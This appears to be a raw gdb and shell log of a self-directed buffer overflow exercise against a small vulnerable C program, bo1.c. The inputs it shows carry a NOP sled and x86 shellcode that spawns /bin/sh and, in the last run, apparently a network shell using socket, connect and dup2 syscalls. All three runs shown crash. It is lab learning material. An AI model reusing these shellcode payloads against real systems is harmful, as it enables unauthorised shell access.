+rcx            0x4141414141414141  4702111234474983745
+rdx            0x34333231414141    14692989456695617
+rsi            0x7fffffffe210      140737488347664
+rdi            0x7fffffffdd16      140737488346390
+rbp            0x7fffffffdd20      0x7fffffffdd20
+rsp            0x7fffffffdca0      0x7fffffffdca0
+r8             0x0                 0
+r9             0x7ffff7fe0d60      140737354009952
+r10            0x3                 3
+r11            0x7ffff7f45108      140737353371912
+r12            0x555555555080      93824992235648
+r13            0x7fffffffde30      140737488346672
+r14            0x0                 0
+r15            0x0                 0
+rip            0x55555555518c      0x55555555518c <copier+35>
+eflags         0x202               [ IF ]
+cs             0x33                51
+ss             0x2b                43
+ds             0x0                 0
+es             0x0                 0
+fs             0x0                 0
+gs             0x0                 0
+(gdb) x/40x $rsp
+0x7fffffffdca0:	0x00000000	0x00000000	0xffffe1aa	0x00007fff
+0x7fffffffdcb0:	0x90909090	0x90909090	0x90909090	0x90909090
+0x7fffffffdcc0:	0x90909090	0x90909090	0x90909090	0x90909090
+0x7fffffffdcd0:	0x90909090	0x90909090	0x90909090	0x90909090
+0x7fffffffdce0:	0x90909090	0x90909090	0x90909090	0x90909090
+0x7fffffffdcf0:	0xc389c031	0x80cd17b0	0x6852d231	0x68732f6e
+0x7fffffffdd00:	0x622f2f68	0x52e38969	0x8de18953	0x80cd0b42
+0x7fffffffdd10:	0x41414141	0x41414141	0x41414141	0x41414141
+0x7fffffffdd20:	0x34333231	0x00007f00	0x555551b5	0x00005555
+0x7fffffffdd30:	0xffffde38	0x00007fff	0x00000000	0x00000002
+(gdb) 0x7fffffffdcc0
+Undefined command: "0x7fffffffdcc0".  Try "help".
+(gdb) quit
+A debugging session is active.
+
+	Inferior 1 [process 2796365] will be killed.
+
+Quit anyway? (y or n) y
+chandan@chandan-desktop:~/Desktop/projects/buf_overflow$ cp b3 b4
+chandan@chandan-desktop:~/Desktop/projects/buf_overflow$ nano b4
+chandan@chandan-desktop:~/Desktop/projects/buf_overflow$ nano b4
+chandan@chandan-desktop:~/Desktop/projects/buf_overflow$ chmod a+x b4
+chandan@chandan-desktop:~/Desktop/projects/buf_overflow$ ./b4 > e4
+chandan@chandan-desktop:~/Desktop/projects/buf_overflow$ hexedit e4
+chandan@chandan-desktop:~/Desktop/projects/buf_overflow$ gdb bo1
+GNU gdb (Ubuntu 9.2-0ubuntu1~20.04.1) 9.2
+Copyright (C) 2020 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.
+Type "show copying" and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+    <http://www.gnu.org/software/gdb/documentation/>.
+
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+Reading symbols from bo1...
+(gdb) list
+1	#include <string.h>
+2	#include <stdio.h>
+3	int copier(char *str) {
+4		char buffer[100];
+5		strcpy(buffer, str);
+6	}
+7	void main(int argc, char *argv[]) {
+8		copier(argv[1]);
+9		printf("Done!\n");
+10	}
+(gdb) break 6
+Breakpoint 1 at 0x118c: file bo1.c, line 6.
+(gdb) run $(cat e4)
+Starting program: /home/chandan/Desktop/projects/buf_overflow/bo1 $(cat e4)
+
+Breakpoint 1, copier (
+    str=0x7fffffffe1a8 '\220' <repeats 64 times>, "\061\300\211ð\027̀1\322Rhn/shh//bi\211\343RS\211\341\215B\v̀", 'A' <repeats 16 times>, "\300\334\377\377\377\177") at bo1.c:6
+6	}
+(gdb) info registers
+rax            0x7fffffffdcb0      140737488346288
+rbx            0x5555555551d0      93824992235984
+rcx            0x4141414141414141  4702111234474983745
+rdx            0x7fffffffdcc041    36028797016653889
+rsi            0x7fffffffe210      140737488347664
+rdi            0x7fffffffdd18      140737488346392
+rbp            0x7fffffffdd20      0x7fffffffdd20
+rsp            0x7fffffffdca0      0x7fffffffdca0
+r8             0x0                 0
+r9             0x7ffff7fe0d60      140737354009952
+r10            0x3                 3
+r11            0x7ffff7f45108      140737353371912
+r12            0x555555555080      93824992235648
+r13            0x7fffffffde30      140737488346672
+r14            0x0                 0
+r15            0x0                 0
+rip            0x55555555518c      0x55555555518c <copier+35>
+eflags         0x202               [ IF ]
+cs             0x33                51
+ss             0x2b                43
+ds             0x0                 0
+es             0x0                 0
+fs             0x0                 0
+gs             0x0                 0
+(gdb) x/40x $rsp
+0x7fffffffdca0:	0x00000000	0x00000000	0xffffe1a8	0x00007fff
+0x7fffffffdcb0:	0x90909090	0x90909090	0x90909090	0x90909090
+0x7fffffffdcc0:	0x90909090	0x90909090	0x90909090	0x90909090
+0x7fffffffdcd0:	0x90909090	0x90909090	0x90909090	0x90909090
+0x7fffffffdce0:	0x90909090	0x90909090	0x90909090	0x90909090
+0x7fffffffdcf0:	0xc389c031	0x80cd17b0	0x6852d231	0x68732f6e
+0x7fffffffdd00:	0x622f2f68	0x52e38969	0x8de18953	0x80cd0b42
+0x7fffffffdd10:	0x41414141	0x41414141	0x41414141	0x41414141
+0x7fffffffdd20:	0xffffdcc0	0x00007fff	0x555551b5	0x00005555
+0x7fffffffdd30:	0xffffde38	0x00007fff	0x00000000	0x00000002
+(gdb) continue
+Continuing.
+Done!
+
+Program received signal SIGSEGV, Segmentation fault.
+0x00007ffff7f7f4a0 in _IO_file_jumps () from /lib/x86_64-linux-gnu/libc.so.6
+(gdb) q
+A debugging session is active.
+
+	Inferior 1 [process 2796556] will be killed.
+
+Quit anyway? (y or n) y
+chandan@chandan-desktop:~/Desktop/projects/buf_overflow$ ./bo1 $(cat e4)
+Done!
+Segmentation fault (core dumped)
+chandan@chandan-desktop:~/Desktop/projects/buf_overflow$ nano b4
+chandan@chandan-desktop:~/Desktop/projects/buf_overflow$ gedit b4
+chandan@chandan-desktop:~/Desktop/projects/buf_overflow$ chmod a+x b4
+chandan@chandan-desktop:~/Desktop/projects/buf_overflow$ ./b4 > e4
+chandan@chandan-desktop:~/Desktop/projects/buf_overflow$ hexedit e4
+chandan@chandan-desktop:~/Desktop/projects/buf_overflow$ gdb bo1
+GNU gdb (Ubuntu 9.2-0ubuntu1~20.04.1) 9.2
+Copyright (C) 2020 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.
+Type "show copying" and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+    <http://www.gnu.org/software/gdb/documentation/>.
+
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+Reading symbols from bo1...
+(gdb) list
+1	#include <string.h>
+2	#include <stdio.h>
+3	int copier(char *str) {
+4		char buffer[100];
+5		strcpy(buffer, str);
+6	}
+7	void main(int argc, char *argv[]) {
+8		copier(argv[1]);
+9		printf("Done!\n");
+10	}
+(gdb) break 6
+Breakpoint 1 at 0x118c: file bo1.c, line 6.
+(gdb) run $(cat e4)
+Starting program: /home/chandan/Desktop/projects/buf_overflow/bo1 $(cat e4)
+/bin/bash: warning: command substitution: ignored null byte in input
+
+Breakpoint 1, copier (
+    str=0x7fffffffe14d '\220' <repeats 64 times>, "\061\300\061\333\061\377\061\366\260)\263\001\211\341̀1\300\061\333\061\311\061Ұ\002\263\001\261\002\262\020\211\346)ԉ4$1\300f\270\021\\Pf\270\002\211\342\061\320\061R1\300\061\366\260*\263\003\211\361\262\020̀1\300\061\333\061\311\061\322\061\366\260?\263\004\261̀\263\001\261\001̀\263\002\261\002̀1\300\061\333\061\311\061\322\061\366\260\vP\273bashS\211\341\061\322̀", 'A' <repeats 13 times>...) at bo1.c:6
+6	}
+(gdb) info registers
+rax            0x7fffffffdc50      140737488346192
+rbx            0x5555555551d0      93824992235984
+rcx            0x4141414141414141  4702111234474983745
+rdx            0x7fffffffdcc041    36028797016653889
+rsi            0x7fffffffe210      140737488347664
+rdi            0x7fffffffdd13      140737488346387
+rbp            0x7fffffffdcc0      0x7fffffffdcc0
+rsp            0x7fffffffdc40      0x7fffffffdc40
+r8             0x0                 0
+r9             0x7ffff7fe0d60      140737354009952
+r10            0x3                 3
+r11            0x7ffff7f45108      140737353371912
+r12            0x555555555080      93824992235648
+r13            0x7fffffffddd0      140737488346576
+r14            0x0                 0
+r15            0x0                 0
+rip            0x55555555518c      0x55555555518c <copier+35>
+eflags         0x202               [ IF ]
+cs             0x33                51
+ss             0x2b                43
+ds             0x0                 0
+es             0x0                 0
+fs             0x0                 0
+gs             0x0                 0
+(gdb) x/40x $rsp
+0x7fffffffdc40:	0x00000000	0x00000000	0xffffe14d	0x00007fff
+0x7fffffffdc50:	0x90909090	0x90909090	0x90909090	0x90909090
+0x7fffffffdc60:	0x90909090	0x90909090	0x90909090	0x90909090
+0x7fffffffdc70:	0x90909090	0x90909090	0x90909090	0x90909090
+0x7fffffffdc80:	0x90909090	0x90909090	0x90909090	0x90909090
+0x7fffffffdc90:	0xdb31c031	0xf631ff31	0x01b329b0	0x80cde189
+0x7fffffffdca0:	0xdb31c031	0xd231c931	0x01b302b0	0x10b202b1
+0x7fffffffdcb0:	0xd429e689	0x31243489	0x11b866c0	0xb866505c
+0x7fffffffdcc0:	0x31e28902	0x315231d0	0xb0f631c0	0x8903b32a
+0x7fffffffdcd0:	0xcd10b2f1	0x31c03180	0x31c931db	0xb0f631d2
+(gdb) continue
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x000055555555518e in copier (
+    str=0x7fffffffe14d '\220' <repeats 64 times>, "\061\300\061\333\061\377\061\366\260)\263\001\211\341̀1\300\061\333\061\311\061Ұ\002\263\001\261\002\262\020\211\346)ԉ4$1\300f\270\021\\Pf\270\002\211\342\061\320\061R1\300\061\366\260*\263\003\211\361\262\020̀1\300\061\333\061\311\061\322\061\366\260?\263\004\261̀\263\001\261\001̀\263\002\261\002̀1\300\061\333\061\311\061\322\061\366\260\vP\273bashS\211\341\061\322̀", 'A' <repeats 13 times>...) at bo1.c:6
+6	}
+(gdb) 
+
+
